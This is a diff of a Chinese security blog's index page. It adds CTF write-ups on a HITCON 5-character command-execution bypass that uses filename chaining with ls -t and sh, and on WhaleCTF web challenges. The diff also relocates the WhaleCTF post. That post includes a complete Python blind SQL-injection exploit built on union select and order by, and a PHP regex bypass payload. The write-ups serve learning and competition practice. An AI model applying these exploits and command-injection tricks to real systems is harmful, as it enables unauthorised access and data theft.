@@ -90,6 +90,82 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/07/14/HITCON CTF命令执行绕过/"> 
+                    HITCON CTF命令执行绕过 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-07-14   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <p>#HITCON CTF命令执行绕过</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近开始暑假生活，基本上是吃喝玩乐。但是过两天还有一场peakgeek，不想让自己松懈，学习一道命令执行的题目，由于没有自己的服务器来搭小马，我就大致在自己的linux进行绕过操作，才发现自己linux命令学的狗屁不是，构造能力也特别垃圾</p>
+<h2 id="BabayFirst"><a href="#BabayFirst" class="headerlink" title="BabayFirst"></a>BabayFirst</h2><p>题目给的源码</p>
+<pre><code>&lt;?php
+    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
+    @mkdir($sandbox);
+    @chdir($sandbox);
+    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {
+        @exec($_GET[&#39;cmd&#39;]);
+    } else if (isset($_GET[&#39;reset&#39;])) {
+        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
+    }
+    highlight_file(__FILE__);</code></pre><h2 id="linux写文件命令"><a href="#linux写文件命令" class="headerlink" title="linux写文件命令"></a>linux写文件命令</h2><p>题目大致意思是给每个人创建一个不同的目录，然后你在当前目录下进行命令执行。</p>
+<p>命令的长度不能超过5<br>这里有一篇文章:<br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener"> 从七个字符长度的任意命令执行到GetShell</a></p>
+<p>文章讲了一种方法，通过<code>&gt;</code>命令建立空文件，再用<code>ls -t&gt;</code>把当前目录的<strong>文件名</strong>当作<strong>文件内容</strong>导入到一个<strong>新的文件</strong>中。<strong>新的文件</strong>中也包含当前文件名，内容按照ascii码表排序换行。</p>
+<p>linux还有一个小技巧，<code>\</code>可以对命令进行换行，是命令的拼接操作，具体如下<br><img src="https://s1.ax1x.com/2018/07/14/PMwdcq.png" alt></p>
+<p>先看一下它是如何Work的：<br><img src="https://s1.ax1x.com/2018/07/14/PMwwj0.png" alt></p>
+<p>这里我们用<code>ls</code>语句把当前文件夹下的文件名写成一个新文件叫做<strong>down</strong>，可以看到我们用<code>&gt;</code>来创建空文件，文件名包含反斜杠<code>\</code>，这样我们执行sh的时候就可以拼接命令。从图也可以看到，遇到错误命令会报错，但是不会终止，依旧输出了1。也就是”echo 1”</p>
+<p>值得注意的是，若文件名有反斜杠，则要用<code>\\</code>来写，还有空格、&gt;要用<code>\</code>、<code>\&gt;</code>来写，用转义符。</p>
+<p>根据图片的ls可以看到，我们的文件名是按ascii码表排的，生成文件的话命令是杂乱的，也是无效的。所以我们用<code>ls -t&gt;</code>按照时间顺序来写入文件。</p>
+<p>但是这题有长度限制, ls -t&gt;已经超过5个字符。<br>网上思路是把ls -t&gt;也写成一个文件，用sh执行，那么就需要构造这个文件了。<br>构造思路纠结了我很久，后来看到一种巧妙的方法，借助<code>&gt;&gt;</code>来文件追加<br>写文件过程:</p>
+<pre><code>&gt;l\\
+&gt;s \\
+&gt;-t\\
+&gt;\&gt;g</code></pre><p>接着执行ls&gt;a，得到a中文件内容应该是这样的：</p>
+<pre><code>&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;</code></pre><p>如果我们追加<code>ls&gt;&gt;a</code>则内容应该是这样的：</p>
+<pre><code>&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;
+&#39;-t\&#39;
+&#39;&gt;g&#39;
+&#39;a&#39;
+&#39;l\&#39;
+&#39;s \&#39;</code></pre><p>前三行和后三行命令无效，只有中间部分的命令有效。所以a文件的可执行内容就只是:ls -t&gt;g</p>
+<p>接着还要构造curl请求来下载一个小马。这点还没有学会，以后再记</p>
+<h2 id="用echo和-gt-gt-追加命令写shell"><a href="#用echo和-gt-gt-追加命令写shell" class="headerlink" title="用echo和&gt;&gt;追加命令写shell"></a>用echo和&gt;&gt;追加命令写shell</h2><p>这个是偶然看到郁离歌的博客里写的，对长度限制不是那么严格的时候可以用。<br><img src="https://s1.ax1x.com/2018/07/14/PMwc4J.png" alt></p>
+<p>但是看到别人博客写，有时候这样php文件不能执行，原因就在于换行。最好可以把POST[]写到一行。所以这个方法不是很好，大多数是用wget或者curl下载小马，但是我还没学会</p>
+<p>相关链接：<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/07/14/HITCON CTF命令执行绕过/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/07/09/内网穿透进行Metasploit渗透/"> 
                     内网穿透进行Metasploit渗透 
                 </a>
@@ -362,6 +438,104 @@ shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.c
         
         <article class="post">
             <h1>
+                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
+                    WhaleCTF的Web题目 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-06-06   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
+<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
+<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
+<pre><code>#coding:utf-8
+import requests
+
+def send(flag,charset):
+    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
+    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    for i in range(len(charset)):
+        c = flag + charset[i]
+        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
+        d = &quot;username={}&amp;password=admin&quot;.format(payload)
+        r = requests.post(url,data=d,headers=h)
+        if &quot;whaleadmin&quot; in r.text:
+            return i
+
+def main():
+    flag = &quot;&quot;
+    num = &quot;0123456789&quot;
+    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    charset = list(num + a_z)
+    for i in range(0,80):
+        ret = send(flag, charset)
+        flag += charset[ret-1]
+        print flag
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
+<pre><code>&lt;?php
+echo &quot;waht the hell?&quot;;
+$flag = &quot;*******&quot;; 
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
+{ 
+    $password = $_POST[&#39;password&#39;]; 
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
+    { 
+        echo &#39;Wrong Format&#39;; 
+        exit; 
+    } 
+    while (TRUE) 
+    { 
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
+        if (6 &gt; preg_match_all($reg, $password, $arr)) 
+            break; 
+        $c = 0; 
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
+        foreach ($ps as $pt) 
+        { 
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
+                $c += 1; 
+        } 
+        if ($c &lt; 3) break; 
+        if (&quot;42&quot; == $password) echo $flag; 
+        else echo &#39;Wrong password&#39;; 
+        exit; 
+    } 
+}
+?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
+<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
+<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
+<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/06/06/WhaleCTF的Web题目/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/06/06/Web题目/"> 
                     CTF中的Web题目 
                 </a>
@@ -626,104 +800,6 @@ def tamper(payload, **kwargs):
             </div>
             <div class="continue">
             <a href="/2018/06/06/Web题目/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
-                    WhaleCTF的Web题目 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-06-06   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
-<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
-<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
-<pre><code>#coding:utf-8
-import requests
-
-def send(flag,charset):
-    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
-    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
-    for i in range(len(charset)):
-        c = flag + charset[i]
-        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
-        d = &quot;username={}&amp;password=admin&quot;.format(payload)
-        r = requests.post(url,data=d,headers=h)
-        if &quot;whaleadmin&quot; in r.text:
-            return i
-
-def main():
-    flag = &quot;&quot;
-    num = &quot;0123456789&quot;
-    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
-    charset = list(num + a_z)
-    for i in range(0,80):
-        ret = send(flag, charset)
-        flag += charset[ret-1]
-        print flag
-
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
-<pre><code>&lt;?php
-echo &quot;waht the hell?&quot;;
-$flag = &quot;*******&quot;; 
-if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
-{ 
-    $password = $_POST[&#39;password&#39;]; 
-    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
-    { 
-        echo &#39;Wrong Format&#39;; 
-        exit; 
-    } 
-    while (TRUE) 
-    { 
-        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
-        if (6 &gt; preg_match_all($reg, $password, $arr)) 
-            break; 
-        $c = 0; 
-        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
-        foreach ($ps as $pt) 
-        { 
-            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
-                $c += 1; 
-        } 
-        if ($c &lt; 3) break; 
-        if (&quot;42&quot; == $password) echo $flag; 
-        else echo &#39;Wrong password&#39;; 
-        exit; 
-    } 
-}
-?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
-<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
-<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
-<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/06/06/WhaleCTF的Web题目/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
